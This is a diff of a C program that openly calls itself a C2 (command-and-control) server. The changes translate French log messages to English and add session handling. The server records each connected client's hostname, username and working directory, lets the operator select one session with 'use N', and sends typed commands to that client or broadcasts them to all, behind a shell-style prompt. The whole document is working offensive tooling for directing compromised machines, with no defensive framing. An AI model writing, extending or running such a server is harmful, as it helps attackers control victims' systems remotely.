@@ -13,19 +13,25 @@
 #include "protocol.h"
 
 typedef struct {
-    int fd;
+    int               fd;
     struct sockaddr_in addr;
-    uint8_t rbuf[BUF_SIZE];
-    int rlen;
-    uint8_t wbuf[BUF_SIZE];
-    int wlen;
-    time_t last_beat;
+    uint8_t           rbuf[BUF_SIZE];
+    int               rlen;
+    uint8_t           wbuf[BUF_SIZE];
+    int               wlen;
+    time_t            last_beat;
+    char              hostname[64];
+    char              username[64];
+    char              cwd[256];
 } Client;
 
-static Client clients[MAX_CLIENTS];
-static int nclients = 0;
-static int srv_fd;
-static volatile int running = 1;
+static Client       clients[MAX_CLIENTS];
+static int          nclients       = 0;
+static int          srv_fd;
+static volatile int running        = 1;
+static int          current_client = -1;
+
+static void print_prompt(void);
 
 static void sigint_handler(int sig) {
     (void)sig;
@@ -34,19 +40,40 @@ static void sigint_handler(int sig) {
 
 static int find_free_slot(void) {
     for (int i = 0; i < MAX_CLIENTS; i++)
-        if (clients[i].fd <= 0) return i;
+        if (clients[i].fd <= 0)
+            return i;
     return -1;
 }
 
 static void remove_client(int idx) {
-    if (idx < 0 || idx >= MAX_CLIENTS || clients[idx].fd <= 0) return;
+    if (idx < 0 || idx >= MAX_CLIENTS || clients[idx].fd <= 0)
+        return;
+
     char ip[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &clients[idx].addr.sin_addr, ip, sizeof(ip));
-    printf("[-] Deconnecte: %s:%d [%d remain]\n",
+    printf("[-] Client disconnected: %s:%d  [%d remaining]\n",
            ip, ntohs(clients[idx].addr.sin_port), nclients - 1);
+
     close(clients[idx].fd);
     memset(&clients[idx], 0, sizeof(Client));
     nclients--;
+}
+
+static void list_clients(void) {
+    printf("[*] %d active client(s):\n", nclients);
+
+    for (int i = 0; i < MAX_CLIENTS; i++) {
+        if (clients[i].fd <= 0) continue;
+
+        char ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &clients[i].addr.sin_addr, ip, sizeof(ip));
+
+        printf("  [%d] %s@%s  (%s)\n",
+               i,
+               clients[i].username[0] ? clients[i].username : "?",
+               clients[i].hostname[0] ? clients[i].hostname : ip,
+               clients[i].cwd[0] ? clients[i].cwd : "?");
+    }
 }
 
 static void broadcast(const uint8_t *data, int dlen) {
@@ -55,14 +82,16 @@ static void broadcast(const uint8_t *data, int dlen) {
     if (plen < 0) return;
 
     time_t now = time(NULL);
+
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].fd <= 0) continue;
-        /* Drop zombie */
+
         if (now - clients[i].last_beat > HEARTBEAT_INT * 3) {
-            printf("[!] Zombie drop: fd=%d\n", clients[i].fd);
+            printf("[!] Zombie client ejected: fd=%d\n", clients[i].fd);
             remove_client(i);
             continue;
         }
+
         if (clients[i].wlen + plen < BUF_SIZE) {
             memcpy(clients[i].wbuf + clients[i].wlen, packed, plen);
             clients[i].wlen += plen;
@@ -70,23 +99,25 @@ static void broadcast(const uint8_t *data, int dlen) {
     }
 }
 
-static void list_clients(void) {
-    printf("[*] %d client(s):\n", nclients);
-    time_t now = time(NULL);
-    for (int i = 0; i < MAX_CLIENTS; i++) {
-        if (clients[i].fd <= 0) continue;
-        char ip[INET_ADDRSTRLEN];
-        inet_ntop(AF_INET, &clients[i].addr.sin_addr, ip, sizeof(ip));
-        printf("  [%d] %s:%d  last_beat=%lds ago\n",
-               clients[i].fd, ip, ntohs(clients[i].addr.sin_port),
-               now - clients[i].last_beat);
-    }
+static void send_to_client(int idx, const uint8_t *data, int dlen) {
+    if (idx < 0 || idx >= MAX_CLIENTS) return;
+    Client *c = &clients[idx];
+    if (c->fd <= 0) return;
+
+    uint8_t packed[HEADER_LEN + MAX_MSG_SIZE];
+    int plen = pack_msg(data, dlen, packed);
+    if (plen < 0) return;
+    if (c->wlen + plen >= BUF_SIZE) return;
+
+    memcpy(c->wbuf + c->wlen, packed, plen);
+    c->wlen += plen;
 }
 
 static int accept_client(void) {
     struct sockaddr_in addr;
     socklen_t addrlen = sizeof(addr);
-    int cfd = accept(srv_fd, (struct sockaddr*)&addr, &addrlen);
+
+    int cfd = accept(srv_fd, (struct sockaddr *)&addr, &addrlen);
     if (cfd < 0) return -1;
 
     int slot = find_free_slot();
@@ -95,61 +126,73 @@ static int accept_client(void) {
         return -1;
     }
 
-    clients[slot].fd = cfd;
-    clients[slot].addr = addr;
-    clients[slot].rlen = 0;
-    clients[slot].wlen = 0;
+    clients[slot].fd        = cfd;
+    clients[slot].addr      = addr;
+    clients[slot].rlen      = 0;
+    clients[slot].wlen      = 0;
     clients[slot].last_beat = time(NULL);
     nclients++;
 
     char ip[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
-    printf("[+] %s:%d connected [%d active]\n", ip, ntohs(addr.sin_port), nclients);
+    printf("[+] %s:%d connected  [%d active]\n", ip, ntohs(addr.sin_port), nclients);
+
     return 0;
 }
 
 static void handle_client_read(int idx) {
     Client *c = &clients[idx];
     uint8_t buf[65536];
+
     int n = read(c->fd, buf, sizeof(buf));
     if (n <= 0) {
         remove_client(idx);
         return;
     }
 
-    if (c->rlen + n > BUF_SIZE) {
-        /* Buffer overflow protection — drop old data */
-        c->rlen = 0;
-    }
+    if (c->rlen + n > BUF_SIZE) c->rlen = 0;
     memcpy(c->rbuf + c->rlen, buf, n);
     c->rlen += n;
 
-    /* Extract all complete messages */
     uint8_t msg[MAX_MSG_SIZE];
     int mlen;
+
     while (1) {
         int consumed = try_unpack(c->rbuf, c->rlen, msg, &mlen);
         if (consumed == 0) break;
-        if (consumed < 0) {
-            /* Protocol error, reset buffer */
-            c->rlen = 0;
-            break;
-        }
-        /* Shift buffer */
+        if (consumed < 0) { c->rlen = 0; break; }
+
         memmove(c->rbuf, c->rbuf + consumed, c->rlen - consumed);
         c->rlen -= consumed;
 
         if (mlen == 0) {
-            /* Heartbeat */
             c->last_beat = time(NULL);
             continue;
         }
 
-        /* Print output from client */
+        msg[mlen] = '\0';
+
+        if (strncmp((char *)msg, "INFO|", 5) == 0) {
+            char *saveptr;
+            strtok_r((char *)msg, "|", &saveptr);
+            char *host = strtok_r(NULL, "|", &saveptr);
+            char *user = strtok_r(NULL, "|", &saveptr);
+            char *cwd  = strtok_r(NULL, "|", &saveptr);
+
+            if (host) strncpy(c->hostname, host, sizeof(c->hostname) - 1);
+            if (user) strncpy(c->username, user, sizeof(c->username) - 1);
+            if (cwd)  strncpy(c->cwd,      cwd,  sizeof(c->cwd) - 1);
+
+            printf("\n[+] Session %d → %s@%s:%s\n", idx, c->username, c->hostname, c->cwd);
+            print_prompt();
+            continue;
+        }
+
         printf("\n[← %s:%d] %.*s",
                inet_ntoa(c->addr.sin_addr),
                ntohs(c->addr.sin_port),
-               mlen, (char*)msg);
+               mlen, (char *)msg);
+        print_prompt();
         fflush(stdout);
     }
 }
@@ -157,14 +200,31 @@ static void handle_client_read(int idx) {
 static void handle_client_write(int idx) {
     Client *c = &clients[idx];
     if (c->wlen <= 0) return;
+
     int n = write(c->fd, c->wbuf, c->wlen);
     if (n <= 0) {
         remove_client(idx);
         return;
     }
+
     if (n < c->wlen)
         memmove(c->wbuf, c->wbuf + n, c->wlen - n);
     c->wlen -= n;
+}
+
+static void print_prompt(void) {
+    if (current_client < 0 || current_client >= MAX_CLIENTS || clients[current_client].fd <= 0) {
+        printf("c2> ");
+        fflush(stdout);
+        return;
+    }
+
+    Client *c = &clients[current_client];
+    printf("%s@%s:%s$ ",
+           c->username[0] ? c->username : "?",
+           c->hostname[0] ? c->hostname : "?",
+           c->cwd[0] ? c->cwd : "?");
+    fflush(stdout);
 }
 
 int main(int argc, char **argv) {
@@ -186,14 +246,15 @@ int main(int argc, char **argv) {
     addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons(port);
 
-    if (bind(srv_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+    if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("bind"); close(srv_fd); return 1;
     }
     if (listen(srv_fd, 10) < 0) {
         perror("listen"); close(srv_fd); return 1;
     }
 
-    printf("[*] Serveur C2 sur 0.0.0.0:%d\n", port);
+    printf("[*] C2 Server listening on 0.0.0.0:%d\n", port);
+    print_prompt();
 
     time_t last_heartbeat = 0;
 
@@ -214,7 +275,7 @@ int main(int argc, char **argv) {
                 max_fd = clients[i].fd;
         }
 
-        struct timeval tv = {0, 100000};  /* 100ms timeout */
+        struct timeval tv = {0, 100000};
         if (select(max_fd + 1, &rfds, &wfds, NULL, &tv) < 0) {
             if (errno == EINTR) continue;
             break;
@@ -222,11 +283,9 @@ int main(int argc, char **argv) {
 
         time_t now = time(NULL);
 
-        /* New connection */
         if (FD_ISSET(srv_fd, &rfds))
             accept_client();
 
-        /* Client I/O */
         for (int i = 0; i < MAX_CLIENTS; i++) {
             if (clients[i].fd <= 0) continue;
             if (FD_ISSET(clients[i].fd, &rfds))
@@ -235,39 +294,60 @@ int main(int argc, char **argv) {
                 handle_client_write(i);
         }
 
-        /* Periodic heartbeat broadcast */
         if (now - last_heartbeat >= HEARTBEAT_INT) {
             broadcast(NULL, 0);
             last_heartbeat = now;
         }
 
-        /* Stdin input (non-blocking via select on fd 0) */
+        /* Non-blocking stdin */
         fd_set stdin_fds;
         FD_ZERO(&stdin_fds);
         FD_SET(0, &stdin_fds);
         struct timeval stdin_tv = {0, 0};
+
         if (select(1, &stdin_fds, NULL, NULL, &stdin_tv) > 0) {
             char line[4096];
             if (!fgets(line, sizeof(line), stdin)) break;
+
             size_t len = strlen(line);
             if (len > 0 && line[len-1] == '\n') line[len-1] = '\0';
 
-            if (strcmp(line, "exit") == 0) {
-                running = 0;
-                break;
-            } else if (strcmp(line, "list") == 0) {
-                list_clients();
-            } else if (strlen(line) > 0) {
-                broadcast((uint8_t*)line, strlen(line));
-                printf("[→ broadcast] %s\n", line);
+            if (strncmp(line, "use ", 4) == 0) {
+                int idx = atoi(line + 4);
+                if (idx >= 0 && idx < MAX_CLIENTS && clients[idx].fd > 0) {
+                    current_client = idx;
+                    printf("[*] Active session: %d\n", idx);
+                } else {
+                    printf("[!] Invalid client\n");
+                }
             }
+            else if (strcmp(line, "back") == 0) {
+                current_client = -1;
+            }
+            else if (strcmp(line, "exit") == 0) {
+                running = 0;
+                continue;
+            }
+            else if (strcmp(line, "list") == 0) {
+                list_clients();
+            }
+            else if (strlen(line) > 0) {
+                if (current_client >= 0) {
+                    send_to_client(current_client, (uint8_t *)line, strlen(line));
+                } else {
+                    broadcast((uint8_t *)line, strlen(line));
+                    printf("[→ broadcast] %s\n", line);
+                }
+            }
+            print_prompt();
         }
     }
 
-    /* Cleanup */
-    printf("\n[*] Arret...\n");
+    printf("\n[*] Shutting down server...\n");
     for (int i = 0; i < MAX_CLIENTS; i++)
-        if (clients[i].fd > 0) close(clients[i].fd);
+        if (clients[i].fd > 0)
+            close(clients[i].fd);
     close(srv_fd);
+
     return 0;
 }
